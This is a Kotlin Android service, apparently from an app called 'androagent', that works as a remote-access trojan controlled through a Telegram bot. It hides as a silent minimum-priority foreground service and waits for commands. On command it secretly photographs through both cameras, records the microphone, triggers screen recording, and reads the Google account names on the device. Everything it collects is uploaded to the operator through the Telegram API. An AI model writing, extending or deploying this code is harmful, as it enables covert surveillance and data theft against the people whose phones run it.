package com.example.androagent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.hardware.Camera
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.accounts.AccountManager
import android.view.Surface
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.JsonParser
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlin.random.Random

class BotService : Service() {

    private val client = OkHttpClient.Builder()
        .connectTimeout(35, TimeUnit.SECONDS)
        .readTimeout(35, TimeUnit.SECONDS)
        .writeTimeout(35, TimeUnit.SECONDS)
        .build()

    private var isRunning = true
    private var lastUpdateId = 0L
    private val gson = Gson()

    private lateinit var deviceId: String

    override fun onCreate() {
        super.onCreate()
        val prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE)
        deviceId = prefs.getString("device_id", "UNKNOWN") ?: "UNKNOWN"

        createNotificationChannel()
        val notification = createNotification()
        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startBotPolling()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "agent_channel",
                "Agent Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background service channel"
                setSound(null, null)
                enableVibration(false)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "agent_channel")
            .setContentTitle("Agent Active")
            .setContentText("Device ID: $deviceId")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    private fun startBotPolling() {
        Thread {
            while (isRunning) {
                try {
                    val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val request = Request.Builder().url(url).get().build()
                    val response = client.newCall(request).execute()
                    val body = response.body?.string()
                    if (body != null) {
                        val json = JsonParser.parseString(body).asJsonObject
                        if (json.get("ok").asBoolean) {
                            val results = json.getAsJsonArray("result")
                            for (i in 0 until results.size()) {
                                val update = results[i].asJsonObject
                                val updateId = update.get("update_id").asLong
                                lastUpdateId = updateId

                                val message = update.getAsJsonObject("message")
                                val from = message.getAsJsonObject("from")
                                val userId = from.get("id").asLong
                                val chatId = message.getAsJsonObject("chat").get("id").asLong

                                if (userId == MainActivity.AUTHORIZED_USER) {
                                    val text = if (message.has("text")) message.get("text").asString else ""
                                    handleCommand(chatId, text)
                                }
                            }
                        }
                    }
                    response.close()
                } catch (e: Exception) {
                    try { Thread.sleep(5000) } catch (ie: InterruptedException) {}
                }
            }
        }.start()
    }

    private fun handleCommand(chatId: Long, text: String) {
        val parts = text.trim().split("\\s+".toRegex(), 2)
        val command = parts[0].lowercase()
        val arg = if (parts.size > 1) parts[1] else ""

        when (command) {
            "/info" -> handleInfo(chatId)
            "/photo" -> handlePhoto(chatId)
            "/audio" -> {
                val duration = arg.toIntOrNull()
                if (duration != null && duration > 0) {
                    handleAudio(chatId, duration)
                } else {
                    sendMessage(chatId, "Usage: /audio <duration_in_seconds>")
                }
            }
            "/screen" -> {
                val duration = arg.toIntOrNull()
                if (duration != null && duration > 0) {
                    handleScreen(chatId, duration)
                } else {
                    sendMessage(chatId, "Usage: /screen <duration_in_seconds>")
                }
            }
            "/stop" -> {
                if (MainActivity.isScreenRecording) {
                    MainActivity.shouldStopScreen = true
                    sendMessage(chatId, "Screen recording stopping...")
                } else {
                    sendMessage(chatId, "No active screen recording.")
                }
            }
        }
    }

    private fun handleInfo(chatId: Long) {
        try {
            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL
            val osVer = Build.VERSION.RELEASE
            val buildNumber = Build.DISPLAY
            val displayMetrics = resources.displayMetrics
            val resolution = "${displayMetrics.widthPixels}x${displayMetrics.heightPixels}"

            val batteryIntent = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0
            val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
            val batteryPct = (level * 100) / scale
            val plugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0
            val chargingState = when {
                plugged == BatteryManager.BATTERY_PLUGGED_AC -> "AC"
                plugged == BatteryManager.BATTERY_PLUGGED_USB -> "USB"
                plugged == BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
                else -> "Not charging"
            }

            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork
            val caps = network?.let { cm.getNetworkCapabilities(it) }
            var connectivity = "Unknown"
            if (caps != null) {
                connectivity = when {
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                    else -> "Other"
                }
            }

            var gmailAccounts = "None found"
            try {
                val am = AccountManager.get(this)
                val accounts = am.getAccountsByType("com.google")
                if (accounts.isNotEmpty()) {
                    gmailAccounts = accounts.joinToString(", ") { it.name }
                }
            } catch (e: Exception) {
                gmailAccounts = "Error reading accounts: ${e.message}"
            }

            val infoText = buildString {
                appendLine("Device ID: $deviceId")
                appendLine("Battery: $batteryPct% ($chargingState)")
                appendLine("Connectivity: $connectivity")
                appendLine("Manufacturer: $manufacturer")
                appendLine("Model: $model")
                appendLine("Android Version: $osVer")
                appendLine("Build: $buildNumber")
                appendLine("Screen: $resolution")
                appendLine("Gmail Accounts: $gmailAccounts")
            }

            sendMessage(chatId, infoText)
        } catch (e: Exception) {
            sendMessage(chatId, "Error gathering info: ${e.message}")
        }
    }

    private fun handlePhoto(chatId: Long) {
        Thread {
            try {
                var backBytes: ByteArray? = null
                var frontBytes: ByteArray? = null

                try {
                    val backCamera = Camera.open(0)
                    val backParams = backCamera.parameters
                    backCamera.parameters = backParams
                    val backTexture = android.graphics.SurfaceTexture(0)
                    backCamera.setPreviewTexture(backTexture)
                    backCamera.startPreview()
                    Thread.sleep(1200)
                    val latch1 = CountDownLatch(1)
                    backCamera.takePicture(null, null, { _, data ->
                        backBytes = data
                        latch1.countDown()
                    })
                    if (latch1.await(5, TimeUnit.SECONDS)) {
                        backCamera.stopPreview()
                    }
                    backCamera.release()
                } catch (e: Exception) {
                    sendMessage(chatId, "Back camera error: ${e.message}")
                }

                try {
                    val frontCamera = Camera.open(1)
                    val frontParams = frontCamera.parameters
                    frontCamera.parameters = frontParams
                    val frontTexture = android.graphics.SurfaceTexture(0)
                    frontCamera.setPreviewTexture(frontTexture)
                    frontCamera.startPreview()
                    Thread.sleep(1200)
                    val latch2 = CountDownLatch(1)
                    frontCamera.takePicture(null, null, { _, data ->
                        frontBytes = data
                        latch2.countDown()
                    })
                    if (latch2.await(5, TimeUnit.SECONDS)) {
                        frontCamera.stopPreview()
                    }
                    frontCamera.release()
                } catch (e: Exception) {
                    sendMessage(chatId, "Front camera error: ${e.message}")
                }

                if (backBytes != null) {
                    val overlaid = addDeviceIdOverlay(backBytes!!)
                    sendPhotoMessage(chatId, overlaid, "back")
                }
                if (frontBytes != null) {
                    val overlaid = addDeviceIdOverlay(frontBytes!!)
                    sendPhotoMessage(chatId, overlaid, "front")
                }
                if (backBytes == null && frontBytes == null) {
                    sendMessage(chatId, "Failed to capture from both cameras.")
                }
            } catch (e: Exception) {
                sendMessage(chatId, "Photo command failed: ${e.message}")
            }
        }.start()
    }

    private fun handleAudio(chatId: Long, durationSeconds: Int) {
        Thread {
            try {
                val file = File(cacheDir, "audio_${deviceId}_${System.currentTimeMillis()}.mp3")
                val recorder = MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100)
                    setAudioBitRate(128000)
                    setOutputFile(file.absolutePath)
                    prepare()
                    start()
                }

                sendMessage(chatId, "Recording audio for $durationSeconds seconds...")

                Thread.sleep(durationSeconds * 1000L)

                try {
                    recorder.stop()
                } catch (e: Exception) {}
                recorder.release()

                if (file.exists() && file.length() > 0) {
                    sendAudioMessage(chatId, file)
                } else {
                    sendMessage(chatId, "Audio recording produced empty file.")
                }
            } catch (e: Exception) {
                sendMessage(chatId, "Audio recording failed: ${e.message}")
            }
        }.start()
    }

    private fun handleScreen(chatId: Long, durationSeconds: Int) {
        MainActivity.pendingScreenChatId = chatId
        MainActivity.pendingScreenDuration = durationSeconds
        val intent = Intent(this, MainActivity::class.java).apply {
            action = "screen_record"
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
        }
        startActivity(intent)
    }

    private fun sendMessage(chatId: Long, text: String) {
        try {
            val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/sendMessage"
            val json = gson.toJson(mapOf(
                "chat_id" to chatId.toString(),
                "text" to text,
                "parse_mode" to "HTML"
            ))
            val body = json.toRequestBody("application/json".toMediaType())
            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute().close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendPhotoMessage(chatId: Long, imageBytes: ByteArray, cameraName: String) {
        try {
            val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/sendPhoto"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId.toString())
                .addFormDataPart("photo", "${cameraName}_${deviceId}.jpg",
                    imageBytes.toRequestBody("image/jpeg".toMediaType()))
                .addFormDataPart("caption", "Device ID: $deviceId - ${cameraName} camera")
                .build()
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendAudioMessage(chatId: Long, file: File) {
        try {
            val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/sendAudio"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId.toString())
                .addFormDataPart("audio", file.name,
                    file.asRequestBody("audio/mpeg".toMediaType()))
                .addFormDataPart("caption", "Device ID: $deviceId")
                .build()
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun addDeviceIdOverlay(imageBytes: ByteArray): ByteArray {
        try {
            val bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.size)
            val mutable = bitmap.copy(Bitmap.Config.ARGB_8888, true)
            val canvas = Canvas(mutable)
            val paint = Paint().apply {
                color = Color.RED
                textSize = mutable.width * 0.05f
                isAntiAlias = true
                setShadowLayer(4f, 2f, 2f, Color.BLACK)
            }
            canvas.drawText("ID: $deviceId", 10f, paint.textSize + 10f, paint)
            val stream = ByteArrayOutputStream()
            mutable.compress(Bitmap.CompressFormat.JPEG, 95, stream)
            return stream.toByteArray()
        } catch (e: Exception) {
            return imageBytes
        }
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }
}
